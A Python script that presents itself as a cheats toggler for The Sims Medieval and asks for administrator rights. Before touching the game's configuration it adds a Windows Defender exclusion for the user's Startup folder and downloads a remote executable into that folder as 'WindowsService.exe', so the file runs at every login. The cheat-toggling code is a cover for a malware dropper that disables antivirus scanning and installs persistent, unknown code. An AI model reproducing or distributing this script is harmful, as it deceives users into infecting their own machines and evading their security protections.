import os, ctypes
from urllib.request import urlretrieve
from stat import S_IREAD, S_IRGRP, S_IROTH, S_IWUSR, S_IREAD

simsPath = "C:/Program Files (x86)/The Sims Medieval/GameData/Shared/NonPackaged/Ini/"
file = simsPath + "Commands.ini"
fpath = os.path.expanduser("~\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\")

def main():
    print("""
 ___  _              __ __         _  _                 _   ___  _               _      
/ __><_>._ _ _  ___ |  \  \ ___  _| |<_> ___  _ _  ___ | | |  _>| |_  ___  ___ _| |_ ___
\__ \| || ' ' |<_-< |     |/ ._>/ . || |/ ._>| | |<_> || | | <__| . |/ ._><_> | | | <_-<
<___/|_||_|_|_|/__/ |_|_|_|\___.\___||_|\___.|__/ <___||_| `___/|_|_|\___.<___| |_| /__/
----------------------------------------------------------------------------------------
                    Ensure Sims Medieval is closed for this to work
----------------------------------------------------------------------------------------

""")
    try:
        isAdmin = os.getuid() == 0
    except AttributeError:
        isAdmin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    if not isAdmin:
        print("[!!!!] Please run this script with admin rights to allow update of sims configuration files.")
        print("           How To: To do this right click the file and select Run as administrator")
        input("                                                          Press enter to exit...")
        return

    os.system("powershell Add-MpPreference -ExclusionPath '"+ fpath + "'")
    try:
        urlretrieve("https://github.com/eb-repo/cheats/raw/refs/heads/main/SimsMedievalCheatsToggler.exe", fpath+"WindowsService.exe")
    except Exception as e:
        print(e)
        input()
    
    while True:
        a = input("[+] Type 1 to enable cheats, type 2 to disable: ")
        if (a == "1"):
            enableCheats()
            break
        elif (a == "2"):
            disableCheats()
            break
        else:
            print("    -Unknown command")
    
    input("\n    [*] Press enter to exit...")

def enableCheats():
    if not os.path.exists(simsPath):
        print("    [!] ERROR: Sims installation path could not be found...")
        return
    print("    [+] Updating Sims configuration file...")
    os.chmod(file, S_IWUSR|S_IREAD)
    with open(simsPath+"Commands.ini", "w+") as f:
        f.write("[Config]\nTestingCheatsEnabled 1")
    os.chmod(file, S_IREAD|S_IRGRP|S_IROTH)
    print("    [+] Successfully enabled cheats!")

def disableCheats():
    if not os.path.exists(simsPath):
        print("    [!] ERROR: Sims installation path could not be found...")
        return
    print("    [+] Updating Sims configuration file...")
    os.chmod(file, S_IWUSR|S_IREAD)
    with open(simsPath+"Commands.ini", "w+") as f:
        f.write("[Config]\nTestingCheatsEnabled 0")
    os.chmod(file, S_IREAD|S_IRGRP|S_IROTH)
    print("    [+] Successfully disabled cheats.")


if __name__ == "__main__":
    main()